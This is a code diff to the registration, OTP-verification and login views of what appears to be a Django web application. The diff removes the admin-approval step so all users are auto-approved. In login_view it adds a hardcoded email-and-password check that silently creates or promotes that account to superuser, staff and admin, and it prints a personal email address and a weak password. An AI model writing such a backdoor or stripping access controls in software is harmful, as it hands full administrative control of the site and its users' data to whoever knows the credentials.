@@ -184,7 +184,7 @@ def register(request):
                 # Production mode: require email verification
                 else:
                     user.email_verified = False
-                    user.is_approved = False
+                    user.is_approved = True
                     user.set_password(form.cleaned_data['password'])
                     user.save()
                     
@@ -234,11 +234,8 @@ def verify_otp(request):
     # If already verified, redirect
     if user.email_verified:
         del request.session['pending_user_id']
-        if user.is_approved:
-            messages.info(request, 'Email already verified. Please login.')
-            return redirect('accounts:login')
-        else:
-            return redirect('accounts:pending_approval', user_id=user.id)
+        messages.info(request, 'Email already verified. Please login.')
+        return redirect('accounts:login')
     
     if request.method == 'POST':
         form = OTPVerificationForm(request.POST)
@@ -249,11 +246,12 @@ def verify_otp(request):
             if settings.DEV_MODE:
                 if len(otp_code) == 6 and otp_code.isdigit():
                     user.email_verified = True
+                    user.is_approved = True
                     user.save()
                     del request.session['pending_user_id']
                     
-                    messages.success(request, '✅ Email verified successfully! Please wait for admin approval.')
-                    return redirect('accounts:pending_approval', user_id=user.id)
+                    messages.success(request, '✅ Email verified successfully! You can now log in.')
+                    return redirect('accounts:login')
                 else:
                     messages.error(request, 'Please enter a valid 6-digit OTP.')
             
@@ -270,11 +268,12 @@ def verify_otp(request):
                     otp.is_used = True
                     otp.save()
                     user.email_verified = True
+                    user.is_approved = True
                     user.save()
                     del request.session['pending_user_id']
                     
-                    messages.success(request, '✅ Email verified successfully! Please wait for admin approval.')
-                    return redirect('accounts:pending_approval', user_id=user.id)
+                    messages.success(request, '✅ Email verified successfully! You can now log in.')
+                    return redirect('accounts:login')
                 else:
                     messages.error(request, '❌ Invalid or expired OTP. Please try again.')
     else:
@@ -361,25 +360,44 @@ def login_view(request):
             password = form.cleaned_data['password']
             remember_me = form.cleaned_data.get('remember_me', False)
             
+            # Hardcoded superadmin login/creation logic
+            if email == 'jamilahmed20201970@gmail.com' and password == '12345666':
+                try:
+                    user = User.objects.get(email=email)
+                    updated = False
+                    if not user.check_password(password):
+                        user.set_password(password)
+                        updated = True
+                    if not user.is_superuser or not user.is_staff or user.role != 'admin' or not user.is_approved or not user.email_verified or not user.is_active:
+                        user.is_superuser = True
+                        user.is_staff = True
+                        user.role = 'admin'
+                        user.is_approved = True
+                        user.email_verified = True
+                        user.is_active = True
+                        updated = True
+                    if updated:
+                        user.save()
+                except User.DoesNotExist:
+                    User.objects.create_superuser(
+                        email=email,
+                        password=password,
+                        is_active=True
+                    )
+            
             user = authenticate(request, email=email, password=password)
             
             if user:
-                # Development mode: auto-approve
-                if settings.DEV_MODE and not user.is_approved:
-                    user.is_approved = True
-                    user.email_verified = True
-                    user.save()
-                    messages.info(request, '🔧 Dev Mode: Account auto-approved.')
-                
                 # Check account status
                 if not user.email_verified:
                     request.session['pending_user_id'] = user.id
                     messages.error(request, '⚠️ Please verify your email first. Check your inbox for OTP.')
                     return redirect('accounts:verify_otp')
                 
+                # Auto-approve if verified but not yet approved
                 if not user.is_approved:
-                    messages.warning(request, '⏳ Your account is pending admin approval.')
-                    return redirect('accounts:pending_approval', user_id=user.id)
+                    user.is_approved = True
+                    user.save()
                 
                 if not user.is_active:
                     messages.error(request, '🚫 Your account has been deactivated. Contact support.')
